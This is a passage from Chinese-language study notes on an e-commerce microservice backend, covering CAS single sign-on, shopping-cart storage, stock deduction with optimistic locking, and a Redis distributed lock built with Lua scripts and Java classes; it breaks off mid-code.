</li>
</ul>
<p>CAS原理:</p>
<p>1 用户第一次访问一个CAS 服务的客户web 应用时（访问URL ：<a href="http://192.168.1.90:8081/web1">http://192.168.1.90:8081/web1</a> ），部署在客户web 应用的cas AuthenticationFilter ，会截获此请求，生成service 参数<br>2 然后redirect 到CAS 服务的login 接口，url为<a href="https://cas:8443/cas/login?service=http://192.168.1.90:8081/web1/">https://cas:8443/cas/login?service=http%3A%2F%2F192.168.1.90%3A8081%2Fweb1%2F</a> ，认证成功后，CAS 服务器会生成认证cookie ，写入浏览器，同时将cookie 缓存到服务器本地，CAS 服务器还会根据service 参数生成ticket,ticket 会保存到服务器，也会加在url 后面<br>3 然后将请求redirect 回客户web 应用，url 为<a href="http://192.168.1.90:8081/web1/?ticket=ST-5-Sx6eyvj7cPPCfn0pMZuMwnbMvxpCBcNAIi6-20">http://192.168.1.90:8081/web1/?ticket=ST-5-Sx6eyvj7cPPCfn0pMZuMwnbMvxpCBcNAIi6-20</a> 。<br>4 这时客户端的AuthenticationFilter 看到ticket 参数后，会跳过，由其后面的TicketValidationFilter 处理，TicketValidationFilter 会利用httpclient 工具访问cas 服务的&#x2F;serviceValidate 接口, 将ticket 、service 都传到此接口，由此接口验证ticket 的有效性，TicketValidationFilter 如果得到验证成功的消息，就会把用户信息写入web 应用的session里。至此为止，SSO 会话就建立起来了<br>5 以后用户在同一浏览器里访问此web 应用时，AuthenticationFilter 会在session 里读取到用户信息，所以就不会去CAS 认证<br>6 如果在此浏览器里访问别的web 应用时，AuthenticationFilter 在session 里读取不到用户信息，会去CAS 的login 接口认证，但这时CAS 会读取到浏览器传来的cookie ，所以CAS 不会要求用户去登录页面登录，只是会根据service 参数生成一个ticket ，然后再和web 应用做一个验证ticket 的交互。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149733.png"></p>
<h1 id="购物车"><a href="#购物车" class="headerlink" title="购物车"></a>购物车</h1><p>未登录购物车:放在本地 LocalStorage; 已登录购物车放在moongoDB</p>
<p>web本地存储主要有两种方式：</p>
<ul>
<li>LocalStorage：localStorage 方法存储的数据没有时间限制。第二天、第二周或下一年之后，数据依然可用。 </li>
<li>SessionStorage：sessionStorage 方法针对一个 session 进行数据存储。当用户关闭浏览器窗口后，数据会被删除。</li>
</ul>
<p>Localstorage和sessionStorage的本质都时一个JS的对象</p>
<p>对象怎么操作，LocalStorage就怎么操作。</p>
<h3 id="ThreadLocal获取登录用户信息"><a href="#ThreadLocal获取登录用户信息" class="headerlink" title="ThreadLocal获取登录用户信息"></a>ThreadLocal获取登录用户信息</h3><p>既然要把用户id作为集合名称一部分，我们就必须想办法在请求进入交易服务时就获取用户信息，并且将当前用户信息与当前请求线程绑定。</p>
<p>其中有两个事情需要我们去思考：</p>
<ul>
<li>如何在请求进入后获取登录用户信息</li>
<li>如何将用户信息与当前请求线程绑定</li>
</ul>
<h4 id="获取用户思路分析"><a href="#获取用户思路分析" class="headerlink" title="获取用户思路分析"></a>获取用户思路分析</h4><p>要获取登录的用户信息，有以下几种方式：</p>
<ul>
<li>方式一：页面直接把用户作为请求参数传递<ul>
<li>优点：简单，方便，代码量为0</li>
<li>缺点：不安全，因为调用购物车CRUD的请求是从页面发过来的，我们不能确定这个传递来的id是不是真的是用户的id</li>
</ul>
</li>
<li>方式二：自己从cookie的token中解析用户信息<ul>
<li>优点：安全</li>
<li>缺点：<ul>
<li>需要重复校验JWT，已经在网关中做过了</li>
<li>代码麻烦</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>安全第一，我们选择方式二，如何解决重复校验的问题呢？我们微服务内部可以只解析用户信息，JWT的安全校验。</p>
<p>为了在请求进入服务后直接能拿到用户，我们可以拦截每一个进入controller的请求，统一完成登录用户的获取，这个拦截可以通过SpringMVC的通用拦截器：<code>HandlerInterceptor</code>来实现。</p>
<h1 id="下单功能"><a href="#下单功能" class="headerlink" title="下单功能"></a>下单功能</h1><h2 id="下单逻辑"><a href="#下单逻辑" class="headerlink" title="下单逻辑"></a>下单逻辑</h2><p>id类型：这里是<code>@TableId(type = IdType.ASSIGN_ID)</code>，代表是自动生成ID，id生成算法是由MybatisPlus内置的雪花算法（SnowFlake，由Twitter公司开源）</p>
<p>问题：为什么不让页面直接把商品价格、图片、spec、标题都提交到服务端，而是只提交了商品id？</p>
<p>答：为了安全考虑，商品价格等敏感信息由客户端提交存在风险。</p>
<h2 id="减库存"><a href="#减库存" class="headerlink" title="减库存"></a>减库存</h2><ul>
<li>支付减库存？<ul>
<li>优点：用户付款，才会减库存，可以确定用户一定有购买意图，不会出现恶意下单导致的库存堆积</li>
<li>缺点：可能用户付款后，发现库存不足，用户体验差</li>
</ul>
</li>
<li>下单减库存<ul>
<li>优点：下单就预留库存，用户付款一定能拿到商品，体验比较好</li>
<li>缺点：如果用户下单，不付款，会占用商家库存，导致它人无法购买</li>
</ul>
</li>
</ul>
<p>我们需要根据不同的场景去做选择，如果更在意用户体验，应该选择下单减库存！但是如何应对下单减库存的缺点呢？</p>
<ul>
<li>超时未支付的订单需要关闭</li>
<li>限定每个用户每天可以取消订单的次数</li>
</ul>
<h4 id="减库存安全问题"><a href="#减库存安全问题" class="headerlink" title="减库存安全问题"></a>减库存安全问题</h4><p>上面这样的操作存在线程安全的风险，因为我们的代码是允许在多线程环境的，当多个用户并发访问时，先判断库存是否充足，然后再执行减库存，会出现一种情况：判断的时候，库存是充足的，但是在减库存之前，有其它线程抢先一步，扣减库存，导致库存不足了，此时就会出现超卖现象！</p>
<h4 id="思路一-同步锁-Redis分布式锁"><a href="#思路一-同步锁-Redis分布式锁" class="headerlink" title="思路一: 同步锁(Redis分布式锁)"></a>思路一: 同步锁(Redis分布式锁)</h4><p>我们一般需要加同步锁，synchronized，目的是让多线程串行执行，从而保证线程安全，但是加synchronized只能保证在当前JVM内的线程安全。</p>
<p>如果是搭建一个微服务集群，同步锁synchronized就失效了。原因是因为线程锁，在多进程时会失效，因为每个进程都有自己的锁。</p>
<p>解决多进程安全问题，必须使用进程锁(分布式锁),这种方案需要额外实现一个分布式锁功能,比较麻烦;  </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149734.png" alt="image-20210415142201086"></p>
<h4 id="思路二-数据库排它锁"><a href="#思路二-数据库排它锁" class="headerlink" title="思路二: 数据库排它锁"></a>思路二: 数据库排它锁</h4><p>数据库锁简单来说有两种：</p>
<ul>
<li>共享锁：读操作时会开启共享锁，此时大家都可以查询</li>
<li>排它锁（互斥锁）：一般是写操作会开启排它锁，此时其它事务无法获取共享锁或排它锁，会阻塞</li>
</ul>
<p>要保证安全，必须加排它锁。</p>
<p>但是我们之前的业务是先查询sku（读），然后判断是否充足，然后减库存（写），这样就会导致多个请求同时查询到一样的库存，减库存还是有安全问题。</p>
<p>我们必须在查询时就加排它锁，怎么办？</p>
<p>可以通过select … for update语法来开启，但是我们要加锁的商品不止一个，此时加锁就是范围锁，甚至是表锁，性能会有较大的影响, </p>
<h4 id="思路三-乐观锁"><a href="#思路三-乐观锁" class="headerlink" title="思路三: 乐观锁"></a>思路三: 乐观锁</h4><p>上述思路1和思路2都是加锁，实现互斥，保证线程安全，我们称为悲观锁。</p>
<ul>
<li>悲观锁：认为线程安全问题一定会发生，因此会加锁保证线程串行执行，从而保证安全。</li>
</ul>
<p>我们为了追求性能，可以使用乐观锁机制。</p>
<ul>
<li>乐观锁：认为线程安全问题不一定会发生，因此允许多线程并行执行，一般会在执行那一刻进行判断和比较，然后根据是否存在风险来决定是否执行操作,乐观锁就是先比较再执行的思路，其实就是CAS（compare and set）的思想。JDK的JUC包下的AtomicInteger、AtomicLong等; Redis的watch,也是乐观锁,CAS原理;</li>
</ul>
<p>简化: 我们在减库存中,可以用stock来代替version,执行sql时,判断stock是否跟自己查询到的一样，</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> tb_stock <span class="keyword">set</span> stock <span class="operator">=</span> stock <span class="operator">-</span> <span class="number">1</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">10</span> <span class="keyword">AND</span> stock <span class="operator">=</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>继续简化: 我们可以不查询库存,直接执行sql,在sql语句中做判断</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> tb_stock <span class="keyword">set</span> stock <span class="operator">=</span> stock <span class="operator">-</span> <span class="number">1</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">10</span> <span class="keyword">AND</span> stock <span class="operator">&gt;=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>继续简化: 我们最终的目的是库存不能超卖,不能为负数,因此我们可以设置stock字段为无符号整数,数据库会自动对写入的数据判断,如果为负,会抛出异常,我们就无需加锁或其他任何判断.</p>
<h1 id="延迟队列清理订单"><a href="#延迟队列清理订单" class="headerlink" title="延迟队列清理订单"></a>延迟队列清理订单</h1><ul>
<li><strong>定期轮询数据库</strong></li>
<li><strong>DelayQueue</strong></li>
<li><strong>定时任务（Quartz）</strong></li>
<li><strong>Redis键过期通知</strong></li>
<li><strong>Redis(sorted_set)</strong> </li>
<li><strong>时间轮</strong></li>
<li><strong>RabbitMQ 死信队列</strong></li>
</ul>
<h1 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h1><h2 id="业务场景"><a href="#业务场景" class="headerlink" title="业务场景"></a>业务场景</h2><p>比如清除过期订单，查询订单是否已支付（幂等问题），更新订单状态（可以用cas解决），关闭订单也要考虑幂等问题（设置订单状态码解决，然后使用分布式锁）。恢复库存也也有分布式事务问题，还需要分布式锁，如果恢复库存失败，则订单状态也得回滚。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> tb_order <span class="keyword">set</span> status <span class="operator">=</span> <span class="number">2</span>, pay_time <span class="operator">=</span> NOW() <span class="keyword">where</span> order_id <span class="operator">=</span> <span class="number">45154151</span> <span class="keyword">AND</span> status <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149735.png" alt="image-20210427224336819"></p>
<p>订单服务假设有10台订单微服务, 库存被恢复了两次;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149736.png" alt="image-20210427224444490"></p>
<h3 id="线程锁"><a href="#线程锁" class="headerlink" title="线程锁"></a>线程锁</h3><p>没用, 多个订单服务是多个JVM,内存中的锁显然是不共享的,每个JVM进程都有自己的锁, 自然无法保证线程的互斥了;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149737.png" alt="image-20210427224642737"></p>
<h3 id="分布式锁-1"><a href="#分布式锁-1" class="headerlink" title="分布式锁"></a>分布式锁</h3><p>多进程可见; 互斥; 可重入(可选); 阻塞锁(可选):获取失败时, 具备重试机制, 尝试再次获取锁; 性能好(可选); 高可用;</p>
<p>常见的分布式锁解决方案包括: 基于数据库实现、基于缓存(Redis)实现、基于zookeeper实现</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149738.png" alt="image-20210427224727255"></p>
<h2 id="Redis实现分布式锁"><a href="#Redis实现分布式锁" class="headerlink" title="Redis实现分布式锁"></a>Redis实现分布式锁</h2><h3 id="版本一-基本实现"><a href="#版本一-基本实现" class="headerlink" title="版本一:基本实现"></a>版本一:基本实现</h3><p>多进程可见: Redis本身就是基于JVM之外的, 因此满足多进程可见的要求;</p>
<p>互斥: 基于redis setnx指令实现, set when not exits, 多次执行setnx命令时, 只有第一个执行的才会成功并返回1, 其余情况都是返回0;</p>
<p>释放锁: 将key删除即可, 使用del xxx; 如果在执行del之前, 服务突然宕机, 那么锁岂不是永远无法删除了?  为了避免这个问题, 可以在获取锁的时候, 给锁加一个有效时间, 当时间超出时, 就会自动释放锁, 这样就不会死锁了.</p>
<p>但是setnx指令没有设置时间的功能, 我们要借助于set指令, 然后结合set的NX和PX来完成</p>
<p>EX: 过期时间, 单位秒; PX: 过期时间,单位毫米; NX: 等同于setnx;</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set lock 001 NX EX 30</span><br><span class="line">OK</span><br><span class="line">set lock 001 NX EX 30</span><br><span class="line">nil</span><br></pre></td></tr></table></figure>



<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149739.png" alt="image-20210427230051328"></p>
<h3 id="版本二-互斥性"><a href="#版本二-互斥性" class="headerlink" title="版本二: 互斥性"></a>版本二: 互斥性</h3><p>版本一的问题:</p>
<ol>
<li>3个进程：A和B和C，在执行任务，并争抢锁，此时A获取了锁，并设置自动过期时间为10s</li>
<li>A开始执行业务，因为某种原因，业务阻塞，耗时超过了10秒，此时锁自动释放了</li>
<li>B恰好此时开始尝试获取锁，因为锁已经自动释放，成功获取锁</li>
<li>A此时业务执行完毕，执行释放锁逻辑（删除key），于是B的锁被释放了，而B其实还在执行业务</li>
<li>此时进程C尝试获取锁，也成功了，因为A把B的锁删除了。</li>
</ol>
<p>问题出现了：B和C同时获取了锁，违反了互斥性！</p>
<p>解决方案: 在删除之前判断锁是否时自己设置的锁, 如果不是, 就不要删除</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149740.png" alt="image-20210427230526972"></p>
<h3 id="版本三-重入性"><a href="#版本三-重入性" class="headerlink" title="版本三: 重入性"></a>版本三: 重入性</h3><p>如果我们在获取锁以后，执行代码的过程中，再次尝试获取锁，执行setnx肯定会失败，因为锁已经存在了。这样有可能导致死锁，这样的锁就是<strong>不可重入</strong>的。</p>
<p>可重入锁可以避免因同一线程中多次获取锁而导致死锁发生;</p>
<p>实现: </p>
<ul>
<li><p>获取锁: 首先尝试获取锁，如果获取失败，<strong>判断这个锁是否是自己的，如果是则允许再次获取</strong>，而且必须记录重复获取锁的次数。</p>
</li>
<li><p>释放锁：释放锁不能直接删除了，因为锁是可重入的，如果锁进入了多次，在最内层直接删除锁，导致外部的业务在没有锁的情况下执行，会有安全问题。因此必须<strong>获取锁时累计重入的次数，释放时则减去重入次数，如果减到0，则可以删除锁</strong>.</p>
</li>
</ul>
<p>因此，存储在锁中的信息就必须包含：key、线程标识、重入次数。不能再使用简单的key-value结构，这里推荐使用hash结构：</p>
<ul>
<li>key：lock</li>
<li>hashKey：线程信息</li>
<li>hashValue：重入次数，默认1</li>
</ul>
<p>需要用到的一些Redis命令包括：</p>
<ul>
<li>EXISTS key：判断一个Key是否存在</li>
<li>HEXISTS key field：判断一个hash的field是否存在</li>
<li>HSET key field value ：给一个hash的field设置一个值</li>
<li>HINCRBY key field increment：给一个hash的field值增加指定数值</li>
<li>EXPIRE key seconds：给一个key设置过期时间</li>
<li>DEL key：删除指定key</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149741.png" alt="image-20210427231119197"></p>
<h3 id="Lua脚本解决原子性问题"><a href="#Lua脚本解决原子性问题" class="headerlink" title="Lua脚本解决原子性问题"></a>Lua脚本解决原子性问题</h3><p>如果不能保证这些Redis命令执行的原子性，则整个过程都是不安全的。</p>
<p>Redis支持Lua脚本来运行多行命令, 并且保证整个脚本运行的原子性;</p>
<p>Redis使用同一个Lua解释器来执行所有命令，同时，Redis保证以一种原子性的方式来执行脚本：当lua脚本在执行的时候，不会有其他脚本和命令同时执行，这种语义类似于 MULTI&#x2F;EXEC。从别的客户端的视角来看，一个lua脚本要么不可见，要么已经执行完。</p>
<p>然而这也意味着，执行一个较慢的lua脚本是不建议的，由于脚本的开销非常低，构造一个快速执行的脚本并非难事。但是你要注意到，当你正在执行一个比较慢的脚本时，所以其他的客户端都无法执行命令。</p>
<h3 id="普通互斥锁"><a href="#普通互斥锁" class="headerlink" title="普通互斥锁"></a>普通互斥锁</h3><p>版本二的实现:</p>
<ul>
<li>获取锁不需要脚本</li>
<li>释放锁需要</li>
</ul>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 判断锁是否是自己的</span></span><br><span class="line"><span class="keyword">if</span> (redis.call(<span class="string">&#x27;GET&#x27;</span>, KEYS[<span class="number">1</span>]) == ARGV[<span class="number">1</span>]) <span class="keyword">then</span></span><br><span class="line">  <span class="comment">-- 是则删除锁</span></span><br><span class="line">  <span class="keyword">return</span> redis.call(<span class="string">&#x27;DEL&#x27;</span>, KEYS[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- 不是则直接返回</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>参数的含义说明：</p>
<ul>
<li>KEYS[1]：就是锁的key，比如”lock”</li>
<li>ARGV[1]：就是线程的唯一标识，可以时随机字符串</li>
</ul>
<h3 id="可重入锁"><a href="#可重入锁" class="headerlink" title="可重入锁"></a>可重入锁</h3><p>获取锁:</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> key = KEYS[<span class="number">1</span>]; <span class="comment">-- 锁的key</span></span><br><span class="line"><span class="keyword">local</span> threadId = ARGV[<span class="number">1</span>]; <span class="comment">-- 线程唯一标识</span></span><br><span class="line"><span class="keyword">local</span> releaseTime = ARGV[<span class="number">2</span>]; <span class="comment">-- 锁的自动释放时间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(redis.call(<span class="string">&#x27;exists&#x27;</span>, key) == <span class="number">0</span>) <span class="keyword">then</span> <span class="comment">-- 判断是否存在</span></span><br><span class="line">	redis.call(<span class="string">&#x27;hset&#x27;</span>, key, threadId, <span class="string">&#x27;1&#x27;</span>); <span class="comment">-- 不存在, 获取锁</span></span><br><span class="line">	redis.call(<span class="string">&#x27;expire&#x27;</span>, key, releaseTime); <span class="comment">-- 设置有效期</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>; <span class="comment">-- 返回结果</span></span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(redis.call(<span class="string">&#x27;hexists&#x27;</span>, key, threadId) == <span class="number">1</span>) <span class="keyword">then</span> <span class="comment">-- 锁已经存在，判断threadId是否是自己	</span></span><br><span class="line">	redis.call(<span class="string">&#x27;hincrby&#x27;</span>, key, threadId, <span class="string">&#x27;1&#x27;</span>); <span class="comment">-- 不存在, 获取锁，重入次数+1</span></span><br><span class="line">	redis.call(<span class="string">&#x27;expire&#x27;</span>, key, releaseTime); <span class="comment">-- 设置有效期</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>; <span class="comment">-- 返回结果</span></span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">-- 代码走到这里,说明获取锁的不是自己，获取锁失败</span></span><br></pre></td></tr></table></figure>

<p>释放锁:</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> key = KEYS[<span class="number">1</span>]; <span class="comment">-- 锁的key</span></span><br><span class="line"><span class="keyword">local</span> threadId = ARGV[<span class="number">1</span>]; <span class="comment">-- 线程唯一标识</span></span><br><span class="line"><span class="keyword">local</span> releaseTime = ARGV[<span class="number">2</span>]; <span class="comment">-- 锁的自动释放时间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (redis.call(<span class="string">&#x27;HEXISTS&#x27;</span>, key, threadId) == <span class="number">0</span>) <span class="keyword">then</span> <span class="comment">-- 判断当前锁是否还是被自己持有</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>; <span class="comment">-- 如果已经不是自己，则直接返回</span></span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">local</span> count = redis.call(<span class="string">&#x27;HINCRBY&#x27;</span>, key, threadId, <span class="number">-1</span>); <span class="comment">-- 是自己的锁，则重入次数-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span>) <span class="keyword">then</span> <span class="comment">-- 判断是否重入次数是否已经为0</span></span><br><span class="line">    redis.call(<span class="string">&#x27;EXPIRE&#x27;</span>, key, releaseTime); <span class="comment">-- 大于0说明不能释放锁，重置有效期然后返回</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    redis.call(<span class="string">&#x27;DEL&#x27;</span>, key); <span class="comment">-- 等于0说明可以释放锁，直接删除</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure>

<p>执行lua脚本</p>
<p>把脚本封装到RedisScript对象中: 需要把脚本内容写到代码中, 作为参数传递, 不够优雅;</p>
<p>自己去创建<code>RedisScript</code>的实现类<code>DefaultRedisScript</code>的对象: 可以把脚本文件写到classpath下的某个位置，然后通过加载这个文件来获取脚本内容，并设置给<code>DefaultRedisScript</code>实例。</p>
<p>定义锁接口:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.demo.lock;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RedisLock</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取锁</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> releaseTime</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(<span class="type">long</span> releaseTime)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 释放锁</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>新建一个RedisLock实现: ReentranRedisLock, 利用静态代码块来加载脚本并初始化:</p>
<p>加载脚本:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReentrantRedisLock</span> &#123;</span><br><span class="line">    <span class="comment">// 获取锁的脚本</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> DefaultRedisScript&lt;Long&gt; LOCK_SCRIPT;</span><br><span class="line">    <span class="comment">// 释放锁的脚本</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> DefaultRedisScript&lt;Object&gt; UNLOCK_SCRIPT;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 加载获取锁的脚本</span></span><br><span class="line">        LOCK_SCRIPT = <span class="keyword">new</span> <span class="title class_">DefaultRedisScript</span>&lt;&gt;();</span><br><span class="line">        LOCK_SCRIPT.setScriptSource(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ResourceScriptSource</span>(<span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;lock.lua&quot;</span>)));</span><br><span class="line">        LOCK_SCRIPT.setResultType(Long.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载释放锁的脚本</span></span><br><span class="line">        UNLOCK_SCRIPT = <span class="keyword">new</span> <span class="title class_">DefaultRedisScript</span>&lt;&gt;();</span><br><span class="line">        UNLOCK_SCRIPT.setScriptSource(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ResourceScriptSource</span>(<span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;unlock.lua&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 其它代码略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现接口:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.demo.lock;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.ClassPathResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.script.DefaultRedisScript;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scripting.support.ResourceScriptSource;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReentrantRedisLock</span> <span class="keyword">implements</span> <span class="title class_">RedisLock</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> StringRedisTemplate redisTemplate;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设定好锁对应的 key</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String key;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 存入的线程信息的前缀，防止与其它JVM中线程信息冲突</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ID_PREFIX</span> <span class="operator">=</span> UUID.randomUUID().toString();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ReentrantRedisLock</span><span class="params">(StringRedisTemplate redisTemplate, String key)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.redisTemplate = redisTemplate;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> DefaultRedisScript&lt;Long&gt; LOCK_SCRIPT;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> DefaultRedisScript&lt;Object&gt; UNLOCK_SCRIPT;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 加载释放锁的脚本</span></span><br><span class="line">        LOCK_SCRIPT = <span class="keyword">new</span> <span class="title class_">DefaultRedisScript</span>&lt;&gt;();</span><br><span class="line">        LOCK_SCRIPT.setScriptSource(<span class="keyword">new</span> <span class="title class_">ResourceScriptSource</span>(<span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;lock.lua&quot;</span>)));</span><br><span class="line">        LOCK_SCRIPT.setResultType(Long.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载释放锁的脚本</span></span><br><span class="line">        UNLOCK_SCRIPT = <span class="keyword">new</span> <span class="title class_">DefaultRedisScript</span>&lt;&gt;();</span><br><span class="line">        UNLOCK_SCRIPT.setScriptSource(<span class="keyword">new</span> <span class="title class_">ResourceScriptSource</span>(<span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;unlock.lua&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 锁释放时间</span></span><br><span class="line">    <span class="keyword">private</span> String releaseTime;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(<span class="type">long</span> releaseTime)</span> &#123;</span><br><span class="line">        <span class="comment">// 记录释放时间</span></span><br><span class="line">        <span class="built_in">this</span>.releaseTime = String.valueOf(releaseTime);</span><br><span class="line">        <span class="comment">// 执行脚本</span></span><br><span class="line">        <span class="type">Long</span> <span class="variable">result</span> <span class="operator">=</span> redisTemplate.execute(</span><br><span class="line">                LOCK_SCRIPT,</span><br><span class="line">                Collections.singletonList(key),</span><br><span class="line">                ID_PREFIX + Thread.currentThread().getId(), <span class="built_in">this</span>.releaseTime);</span><br><span class="line">        <span class="comment">// 判断结果</span></span><br><span class="line">        <span class="keyword">return</span> result != <span class="literal">null</span> &amp;&amp; result.intValue() == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 执行脚本</span></span><br><span class="line">        redisTemplate.execute(</span><br><span class="line">                UNLOCK_SCRIPT,</span><br><span class="line">                Collections.singletonList(key),</span><br><span class="line">                ID_PREFIX + Thread.currentThread().getId(), <span class="built_in">this</span>.releaseTime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义锁工厂:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.demo.lock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisLockFactory</span> 